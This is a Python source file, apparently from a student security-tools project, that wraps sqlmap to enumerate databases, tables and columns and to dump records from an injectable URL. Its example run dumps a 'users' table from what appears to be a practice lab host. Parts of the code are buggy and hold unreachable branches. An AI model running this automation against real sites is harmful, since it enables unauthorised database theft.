import subprocess
import threading
import pexpect
import os
import re

#file:./api/TEST/test2
#Option: [URL:-u, read request head file:-r, show db:--dbs, choose the db:-D, show db tables:--tables,
#         choose the tables:-T, show colums setting(e.g:Int):--columns, show table record:--dump,
#         confirm the parameter:-p, Run By Default [Y/N]:--batch]
#
# add level option and risk option on gui and backend

class SQLMap:
    def __init__(self, injection_point:str, user_agent="FYP_tools", tables_arg:bool=False, columns_arg:bool=False, records_arg:bool=False, level_arg:str=1, risk_arg:str=1, db_name=None, table_name=None, sqlmap_result_filter_arg=False, phpSessId:str=None) -> None:
        self.tool = "sqlmap"
        self.url_injPoint_arg = "-u"
        self.request_head_arg = "-r"
        self.cookie_arg = "--cookie"
        self.show_tables_arg = "--tables"
        self.show_dbs_arg = "--dbs"
        self.show_record_arg = "--dump"
        self.show_columns_arg = "--columns"
        self.parameter_arg = "-p"
        self.database_arg = "-D"
        self.table_arg = "-T"
        self.payload_level_arg = "--level"
        self.payload_risk_arg = "--risk"
        self.level_arg = level_arg
        self.risk_arg = risk_arg
        self.no_asking_arg = "--batch"
        self.user_agent_arg = "--user-agent"
        self.phpSessId = phpSessId
        self.injection_point = str(injection_point)
        self.user_agent = user_agent
        self.db_name = db_name
        self.table_name = table_name
        self.sqlmap_result_filter_arg = sqlmap_result_filter_arg
        self.args_array = list()
        self.cmd =[]
        self.tables_arg = tables_arg
        self.columns_arg = columns_arg
        self.records_arg = records_arg
        
        if self.tables_arg == True:
            self.args_array.append(self.show_tables_arg)
            pass
        elif self.columns_arg == True:
            self.args_array.append(self.show_columns_arg)
            pass
        elif self.records_arg == True:
            self.args_array.append(self.show_record_arg)
        
        # print(injection_point)
        # print(db_name)
        # print(tables_arg)
        # print(columns_arg)

        if user_agent != None:
            self.args_array.extend([self.user_agent_arg, user_agent])
        if db_name != None:
            self.args_array.extend([self.database_arg, db_name])
        if table_name != None:
            self.args_array.extend([self.table_arg, table_name])
            

    def sqlmap_get_methon(self):
        temp_dbs_array = list()
        temp_dict = dict()
            
        if self.phpSessId == None:
            if re.search("\.txt$", self.injection_point):
                self.cmd = [self.tool, self.request_head_arg, self.injection_point, self.show_dbs_arg, self.no_asking_arg, self.payload_risk_arg, self.risk_arg, self.payload_level_arg, self.level_arg]
                print(self.cmd)
                
                self.cmd.extend(self.args_array)
                # if (self.show_tables_arg in self.cmd) and (self.database_arg, self.table_arg in self.cmd):
                #     self.cmd = self.cmd.remove(self.show_tables_arg)
                #     pass
                
                #sqlmap -u http://www.xxx.com --dbs 
                #sqlmap -u http://www.xxx.com -D d7db --tables
                #sqlmap -u http://www.xxx.com -D d7db -T user --columns
                #sqlmap -u http://www.xxx.com -D d7db -T user --dump
                
                self.result = self.execute_command()

                if self.sqlmap_result_filter_arg == True:
                    filted_result = self.sqlmap_result_filter(result)
                    return filted_result
                elif self.sqlmap_result_filter_arg == False:
                    return self.result

                for line in result:
                    # line = line.decode("utf-8")
                    if line.find("[*] starting") != -1:
                        pass
                    elif line.find("[*] ending") != -1:
                        pass
                    elif line.find("[*]") != -1:
                        final = line.replace("[*]", "")
                        final = final.strip()
                        temp_dbs_array.append(final)
                    else:
                        pass

                    if line.find("Type:") != -1:
                        payload_type = line.replace("Type:", "").strip()
                        if payload_type not in temp_dict:
                            temp_dict[payload_type] = ""

                    if line.find("Payload:") != -1:
                        payload = line.replace("Payload:", "").strip()
                        temp_dict[payload_type] = payload
                    else:
                        pass

                return temp_dbs_array, temp_dict

            elif re.search("^(http|https)://", self.injection_point):
                self.cmd = [self.tool, self.url_injPoint_arg, self.injection_point, self.show_dbs_arg, self.no_asking_arg, self.payload_level_arg, self.level_arg, self.payload_risk_arg, self.risk_arg]
                print(self.cmd)
               
                self.cmd.extend(self.args_array)
                self.result = self.execute_command()
                
                if self.sqlmap_result_filter_arg == True:
                    filted_result = self.sqlmap_result_filter()
                    return filted_result
                elif self.sqlmap_result_filter_arg == False:
                    return self.result

                # write a filter for the url injection point's result
                for line in result:
                    # line - line.decode("utf-8")
                    if line.find("[*] starting") != -1:
                        pass
                    elif line.find("[*] ending") != -1:
                        pass
                    elif line.find("[*]") != -1:
                        final = line.replace("[*]", "")
                        final = final.strip()
                        temp_dbs_array.append(final)
                    else:
                        pass

                    if line.find("Type:") != -1:
                        payload_type = line.replace("Type:", "").strip()
                        if payload_type not in temp_dict:
                            temp_dict[payload_type] = ""

                    if line.find("Payload:") != -1:
                        payload = line.replace("Payload:", "").strip()
                        temp_dict[payload_type] = payload
                    else:
                        pass

                return temp_dbs_array, temp_dict

        elif self.phpSessId != None: # SQL injection with session id
            self.cmd = [self.tool, self.url_injPoint_arg, self.injection_point, self.cookie_arg, self.phpSessId, self.show_dbs_arg, self.no_asking_arg, self.payload_risk_arg, self.risk_arg, self.payload_level_arg, self.level_arg]
            # self.cmd = f"{self.tool} {self.url_injPoint_arg} {self.injection_point} {self.cookie_arg} {self.phpSessId} {self.show_dbs_arg} {self.no_asking_arg}"
            self.cmd.extend(self.args_array)
            self.result = self.execute_command()
            return self.result 
        else:
            return False 

    def sqlmap_post_methon(self):
        self.cmd = [self.tool, self.request_head_arg, self.injection_point, self.show_dbs_arg, self.no_asking_arg, self.payload_level_arg, self.level_arg, self.payload_risk_arg, self.risk_arg]
        # cmd = f"{self.tool} {self.request_head_arg} {self.injection_point} {self.show_dbs_arg} {self.no_asking_arg}"

        self.result = self.execute_command()
    
    def execute_command(self) -> str:
        print("sqlmap.py line181: ",self.cmd)
        run = subprocess.Popen(self.cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, encoding="utf-8")
        run = run.stdout.readlines()
        
        return run

    def sqlmap_result_filter(self):
        temp_dbs_array = list()
        temp_dict = dict()
        tables_temp_array = list()
        columns_temp_array = list()
        records_temp_array = list()
        # print(self.result)
        for line in self.result:
            # line - line.decode("utf-8")
            if line.find("[*] starting") != -1:
                pass
            elif line.find("[*] ending") != -1:
                pass
            elif line.find("[*]") != -1:
                final = line.replace("[*]", "")
                final = final.strip()
                temp_dbs_array.append(final)
            else:
                pass

            if line.find("Type:") != -1:
                payload_type = line.replace("Type:", "").strip()
                if payload_type not in temp_dict:
                    temp_dict[payload_type] = ""

            if line.find("Payload:") != -1:
                payload = line.replace("Payload:", "").strip()
                temp_dict[payload_type] = payload
            else:
                pass
            
            if self.tables_arg == True:
                if line.find("| ") != -1:
                    if line.find(" |\n") != -1 and line.find("| ") <=2 :
                        line = line.replace("|","")
                        line = line.strip()
                        tables_temp_array.append(line)
                else:
                    pass
            elif self.columns_arg == True:
                if line.find("| ") != -1:
                    if line.find(" |\n") != -1 and line.find("| ") <=2 :
                        columns_temp_array.append(line)

                else:
                    pass
            elif self.records_arg == True:
                if line.find("| ") != -1:
                    if line.find(" |\n") != -1 and line.find("| ") <=2 :
                        records_temp_array.append(line)
                else:
                    pass
        #columns_temp_arrays formating
        temp_column_dict = dict()
        if columns_temp_array:
            for line in range (1,len(columns_temp_array)):
                x=columns_temp_array[line].split("|")
                column_name = x[1].replace(" ","")
                column_datatype = x[2].replace(" ","")
                temp_column_dict[column_name] = column_datatype 
                
        #     columns_temp_array = temp_column_dict      
        #records_temp_array formating             
        if records_temp_array:
            temp_list = list()
            record_temp_dict_list = list()
            for x in records_temp_array:
                x = x.replace(" ","")
                x = x.split("|")
                temp_list.append(x)
            if len(temp_list) <= 1:
                print("No record")
            for record_line in range(1,len(temp_list)):
                current_line = temp_list[record_line]
                temp_dict = {}
                for col in range(1,len(current_line)- 1):
                    value = current_line[col]
                    if value == "<blank>":
                        value = ""
                    temp_dict[f"{temp_list[0][col]}"]= value
                record_temp_dict_list.append(temp_dict)
            records_temp_array = record_temp_dict_list

        return temp_dbs_array, temp_dict, tables_temp_array, temp_column_dict, records_temp_array

if __name__=="__main__":
    sqlmap =  SQLMap(injection_point="http://dc8.local/?nid=1",user_agen="test",tables_arg=False,columns_arg=False,records_arg=True,db_name='d7db',table_name='users')
    result = sqlmap.sqlmap_get_methon()
    result = sqlmap.sqlmap_result_filter()

    for x in result:
        # print("hihi")
        print(f"{x}\n")
